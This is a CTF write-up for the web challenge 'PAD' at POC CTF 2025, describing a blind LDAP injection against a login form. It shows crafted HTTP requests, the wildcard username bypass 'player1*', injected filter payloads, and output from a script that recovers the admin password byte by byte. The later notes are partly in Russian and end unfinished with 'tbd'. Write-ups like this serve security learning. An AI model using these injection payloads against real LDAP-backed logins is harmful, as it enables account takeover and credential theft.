# CTF Writeup

CTF: POC CTF 2025 (https://flagyard.com/events/65fb235d-0944-42cc-b46e-f6247b2d9e31)
Chal name: PAD
Type: WEB
Solves: 51 out 500 (10% of players could solve it)


## Intro TL/DR

Ok, folks what looked like a benign login bypass challenge turned into a full scale BLind LDAP injeciton attack!

Solved by combining Auth Bypass LDAP trechniques and OID 2.5.13.18 userPassword Attribute exploit.

## Recon

Started by navigating to the instance: http://btfryxiw.playat.flagyard.com/login.

![Well the app looked really harmless.](images/login.png)

`Admin:admin`? Nope 🤦

Ok, better look at source code (`Ctrl + U`):

```html
<form id="loginForm">
    <div class="form-group">
        <label for="username">Username</label>
        <input type="text" id="username" name="username" required autocomplete="username" placeholder="Enter your username">
    </div>
    <!-- player1 / password123 -->
    <div class="form-group">
        <label for="password">Password</label>
        <input type="password" id="password" name="password" required autocomplete="current-password" placeholder="Enter your password">
    </div>

```

Nice! Found some user password in the login page source code. Lets see.

```bash

POST /login HTTP/1.1
Host: btfryxiw.playat.flagyard.com
Content-Type: multipart/form-data; boundary=----geckoformboundary18c55b09bf115fede816ea0a548b788
Content-Length: 294

------geckoformboundary18c55b09bf115fede816ea0a548b788
Content-Disposition: form-data; name="username"

player1
------geckoformboundary18c55b09bf115fede816ea0a548b788
Content-Disposition: form-data; name="password"

password123
------geckoformboundary18c55b09bf115fede816ea0a548b788--

```

![Nothing interesting on the main page.](images/main.png)

The main page is quite static so the vuln must be within the authentication.
Lets look at cookies.

App sets some cookie. 

```http

HTTP/1.1 200 OK
Date: Sun, 12 Oct 2025 16:01:24 GMT
Content-Type: application/json
Content-Length: 71
Connection: keep-alive
Vary: Cookie
Set-Cookie: session=.eJyrVkosLclIzSvJTE4sSU1RsiopKk3VUSotTi2KzwRylUozU2wLchIrU4sMdfJLbUESxTopybYFiSk5IDonPzkxRwmiIy8xNxWoBapcqRYAOD8hRw.aOvQ1A.xA6NsmlSZBM2OCGtRC5G_A44H0E; HttpOnly; Path=/

```

That looks like some flask cookie to me! Lets decode it:

```bash
$ flask-unsign --decode --cookie '.eJyrVkosLclIzSvJTE4sSU1RsiopKk3VUSotTi2KzwRylUozU2wLchIrU4sMdfJLbUESxTopybYFiSk5IDonPzkxRwmiIy8xNxWoBapcqRYAOD8hRw.aOvQ1A.xA6NsmlSZBM2OCGtRC5G_A44H0E'

{'authenticated': True, 'user_id': 'uid=player1,ou=users,dc=padl,dc=local', 'username': 'player1'}
```

Ok it definitely looks liek some LDAP syntax `uid=player1,ou=users,dc=padl,dc=local`. But lets do one more simple thing before tackling the login page again. I wanna tryu to bruteforce the cookie signature since it can be done by same program `flask-unsign`:

```bash

flask-unsign --unsign --cookie '.eJyrVkosLclIzSvJTE4sSU1RsiopKk3VUSotTi2KzwRylUozU2wLchIrU4sMdfJLbUESxTopybYFiSk5IDonPzkxRwmiIy8xNxWoBapcqRYAOD8hRw.aOvQ1A.xA6NsmlSZBM2OCGtRC5G_A44H0E'
[*] Session decodes to: {'authenticated': True, 'user_id': 'uid=player1,ou=users,dc=padl,dc=local', 'username': 'player1'}
[*] No wordlist selected, falling back to default wordlist..
[*] Starting brute-forcer with 8 threads..
[*] Attempted (2176): -----BEGIN PRIVATE KEY-----ECR
[*] Attempted (38272): w.;>{1t hozzfrsly generated st
[!] Failed to find secret key after 55982 attempts.ea

```

It used all of the built in words and believe me I tried rockyou.txt at the CTF. But nothing here so... We need to bet on LDAP injection.

### Exploring LDAP injection

If there is some LDAP injection then this if we send instead of `player1` username the one with some LDAP all-char-symbol `player1*` can it help us?

```bash

POST /login HTTP/1.1
Host: btfryxiw.playat.flagyard.com
Content-Type: multipart/form-data; boundary=----geckoformboundary18c55b09bf115fede816ea0a548b788
Content-Length: 294

------geckoformboundary18c55b09bf115fede816ea0a548b788
Content-Disposition: form-data; name="username"

player1*
------geckoformboundary18c55b09bf115fede816ea0a548b788
Content-Disposition: form-data; name="password"

password123
------geckoformboundary18c55b09bf115fede816ea0a548b788--

```

YES, we get correct login. I explain here why. The Backend must be doing some unsanitized look up of the sort:

```bash

# it was not PHP in CTF but I like it :)
$login = (&(username = $_POST["username"])(password = $_POST["password"]))

```
So app gets creds via POST request and puts in that paranthesis statement. If the variable `$login` is TRUE then we can get in. How does the comparison work? 

At the begining there is the `&` sign which is like AND operator. It compares two object that each yield TRUE OR FALSE: `(& (TRUE)(FALSE))`, in this case password is wrong so statement is FALSE.

The idea is to control username and password inputs to fool it to be TRUE. Lets try the game by setting password to `*` this should always return TRUE. BUT no! Password was sanitized. So we can only control the username.

And we can easily guess that `admin` is a valid username because when we trie admin:admin it said `Invalid password` and not `Username not found`.



## Foothold

## Exploitation


Вот теперь понятно что мы имеем дело с LDAP аутентификацией

находим валидный аттрибут

userPassword
objectClass
commonName
surname
name
cn
sn

подтверждаем

player1)(&FUZZ&=*)

userPassword валиден, значит это наш аттрибут пароля и мы можем его контролировать!


player1)(userPassword:2.5.13.18:=\70\62

След число должно быть на 1 больше чем то с которым оно сравнивается и так и далее


```bash
(venv) yok@nix:~/Sandbox/Flagyard25/PADL$ python3 passwd.py 
Found byte 1: 0x50 ('P'); current payload suffix: \50
Found byte 2: 0x34 ('4'); current payload suffix: \34
Found byte 3: 0x64 ('d'); current payload suffix: \64
Found byte 4: 0x6c ('l'); current payload suffix: \6c
Found byte 5: 0x5f ('_'); current payload suffix: \5f
Found byte 6: 0x41 ('A'); current payload suffix: \41
Found byte 7: 0x64 ('d'); current payload suffix: \64
Found byte 8: 0x6d ('m'); current payload suffix: \6d
Found byte 9: 0x31 ('1'); current payload suffix: \31
Found byte 10: 0x6e ('n'); current payload suffix: \6e
Found byte 11: 0x5f ('_'); current payload suffix: \5f
Found byte 12: 0x53 ('S'); current payload suffix: \53
Found byte 13: 0x33 ('3'); current payload suffix: \33
Found byte 14: 0x63 ('c'); current payload suffix: \63

...

Found byte 59: 0x32 ('2'); current payload suffix: \32
Found byte 60: 0x30 ('0'); current payload suffix: \30
Found byte 61: 0x32 ('2'); current payload suffix: \32
Found byte 62: 0x34 ('4'); current payload suffix: \34
Found byte 63: 0x21 ('!'); current payload suffix: \21
Found byte 64: 0x21 ('!'); current payload suffix: \21
Traceback (most recent call last):
  File "/home/yok/Sandbox/Flagyard25/PADL/passwd.py", line 61, in <module>
    password_bytes += bytes([saved_byte_value])
                      ^^^^^^^^^^^^^^^^^^^^^^^^^
ValueError: bytes must be in range(0, 256)

```
Ouch, there is an error but I got the password anyway and flagged lucky for me: `P4dl_Adm1n_S3cur3_P@ssw0rd_W1th_Sp3c14l_Ch4r5_And_Numb3r5_2024!!`. But looking back at the code we can spot the error:

tbd